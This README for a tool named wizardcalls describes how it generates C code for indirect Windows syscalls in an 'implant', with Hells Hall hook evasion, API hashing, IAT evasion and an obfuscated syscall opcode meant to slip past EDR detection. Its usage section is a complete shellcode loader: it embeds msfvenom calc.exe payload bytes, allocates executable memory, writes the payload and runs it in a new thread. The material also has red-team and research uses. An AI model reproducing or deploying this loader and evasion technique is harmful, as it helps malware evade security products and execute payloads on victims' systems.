
## About Project

This tool creates the C code files required to implement indirect syscalls in an implant. The tool uses the [Hells Hall](https://github.com/Maldev-Academy/HellHall) SSN resolution method to assist with userland hook evasion. At this time, the project only supports x64 & is intended be compiled with MSVC.

### Features

:heavy_check_mark: C Code  
:heavy_check_mark: API Hashing & dynamic hash generation  
:heavy_check_mark: Provides function prototypes for each system call, making implementation easier for the end user     
:heavy_check_mark: Userland hook evasion via hells hall  
:heavy_check_mark: Custom implmentation of various windows API calls for IAT evasion  
:heavy_check_mark: Randomized jump addressing for syscall instruction, hides true syscall ret address after syscall is executed  
:heavy_check_mark: Obfuscated syscall opcode to avoid 0x050F signature in binary, dynamically generated  

### How It Works

This tool generates the SYSTEM_CALLS_TABLES structure, a listing of SYSTEM_CALL structures. A list of hashes is also generated, containing each syscall hash in the order that the corresponding SYSTEM_CALL structure is indexed in the SYSTEM_CALL_TABLES structure. This hash list is defined in the macro `NT_API_FUNCTION_HASH_LIST`. The `InitializeSystemCalls()` will loop through the SYTSEM_CALL_TABLE structure & hash list, resolving each hash into it's SYSTEM_CALL corresponding structure using the HellsHall method implemented in the `GetSystemCall()` function.

Hells Hall evades userland hooking by detecting an EDR hooks `jmp` instruction within the syscall stub. If the instruction is detected, the code will search up & down in the syscall stubs to locate an unhooked syscall & retrieve the SSN from it. While searching syscalls, the amount of syscalls that have been searched is tracked. When an unhooked syscall is resolved, the amount of syscalls searched will be added or subtracted from the SSN that gets resolved, depening on the search being performed up or down in memory. This math will provide the true SSN of the hooked syscall. If the target syscall is not hooked, the SSN is directly retrieved. Next, a jmp address pointing to the syscall instruction is retrieved. When it's time to execute the syscall, Hells Hall will perform a jump to the syscall instruction so that RIP points to ntdll when the syscall completes execution.

## Credits

[Hells Hall](https://github.com/Maldev-Academy/HellHall)
- [mrd0x](https://github.com/mrd0x)
- [NUL0x4C](https://github.com/NUL0x4C)

[VX-API](https://github.com/vxunderground/VX-API)
- [vx-underground & friends](https://vx-underground.org/)

[NT API Dataset](https://github.com/reverseame/winapi-categories/tree/main)
- [reverseame](https://github.com/reverseame)

## Usage

Use of this tool is simple. Provide your api calls to the python script via the command line or in a file to generate the source code & add the code to your project. Include the `HellsHall.h` header file where you want to access the code.

### Example
1. Build the required source files for your desired system calls. The files will be deposited in the **Out** directory by default. Move these files to your project code. Alternatively, you can speficy a directory to write files to with **--outdir**.

```
python .\wizardcalls.py --apicalls NtAllocateVirtualMemory NtFreeVirtualMemory NtCreateThreadEx NtWriteVirtualMemory NtWaitForSingleObject
```

2. Include the `HellsHall.h` header file in your project to gain access to the system calls generated with this tool.

3. Use the `InitializeSystemCalls()` function to initialize your syscalls & begin calling your functions.

> [!IMPORTANT]
> InitializeSystemCalls() only needs to be called once. The function returns TRUE if the syscalls are successfully initialized & FALSE if they are not.


```c
#include "HellsHall.h"

int main() {
	/* Msf venom calc payload */
	char Shellcode[] = {
		0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
		0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
		0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
		0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
		0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
		0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
		0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
		0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
		0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
		0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
		0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
		0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
		0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
		0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
		0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
		0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
		0x65, 0x78, 0x65, 0x00
	};
	PVOID pShellcode = 0;
	SIZE_T BufferSize = sizeof(Shellcode);
	SIZE_T BytesWritten = 0;
	HANDLE hThread = 0;
	NTSTATUS Status = 0;

	/* Init system calls structure */
	InitializeSystemCalls();

	/* Allocate memory for payload */
	Status = NtAllocateVirtualMemory((HANDLE)-1, &pShellcode, 0, &BufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (Status != 0x0) {
		dbg_print("NtAllocate failed with error: 0x%0.8X\n", Status);
		return -1;
	}
	dbg_print("Allocated memory at 0x%p\n", pShellcode);
	
	/* Write payload to memory */
	Status = NtWriteVirtualMemory((HANDLE)-1, pShellcode, Shellcode, sizeof(Shellcode), &BytesWritten);
	if (Status != 0x0 || BytesWritten != sizeof(Shellcode)) {
		dbg_print("NtWrite failed with error: 0x%0.8X\n", Status);
		return -1;
	}
	dbg_print("Wrote %zu bytes of shellcode to memory at 0x%p\n", BytesWritten, pShellcode);

	/* Execute payload */
	Status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, 0, (HANDLE)-1, (LPTHREAD_START_ROUTINE)pShellcode, 0, 0, 0, 0, 0, 0);
	if (Status != 0x0 || hThread == NULL) {
		dbg_print("NtCreateThreadEx failed with error: 0x%0.8X\n", Status);
		return -1;
	}
	dbg_print("Executed payload!\n");

	/* Wait for thread to finish */
	Status = NtWaitForSingleObject(hThread, FALSE, NULL);
	if (Status != 0x0) {
		dbg_print("NtWaitForSingleObject failed with error: 0x%0.8X\n", Status);
		return -1;
	}

	/* Release payload memory */
	Status = NtFreeVirtualMemory((HANDLE)-1, &pShellcode, &BufferSize, MEM_RELEASE);
	if (Status != 0x0) {
		dbg_print("NtFree failed with error: 0x%0.8X\n", Status);
		return -1;
	}
	dbg_print("Released memory at 0x%p\n", pShellcode);

	return 0;
}
```

### wizardcalls.py arguments
```
usage: wizardcalls.py [-h] [--seed SEED] [--algo {sdbm,djb2}] [--outdir OUTDIR] [--apicalls APICALLS [APICALLS ...] | --file FILE | --source_file SOURCE_FILE] [--seperate_structures]

options:
  -h, --help            show this help message and exit
  --seed SEED           Seed for the hashing algorithm. Generates a random seed if none is provided.
  --algo {sdbm,djb2}    A hashing algorithm to use. Defaults to sdbm.
  --outdir OUTDIR       A directory to write the source files to. Defaults to "Out" directory.
  --apicalls APICALLS [APICALLS ...]
                        List of win32 native api calls to generate the template for. See https://www.geoffchappell.com/studies/windows/win32/ntdll/api/native.htm for more information on the win32 native api.
  --file FILE           Path to file containing a list of api calls. Use a new line [\n] to seperate each api call.
  --source_file SOURCE_FILE
                        A C source file using the NT API. Under development. Not available at the moment.
  --seperate_structures
                        Create the NT / Win32 structure file seperately from the hells hall header file
```

# To Do
- Add djb2 algorithm compatibility
- Parse ntapi calls from source file
- x86 support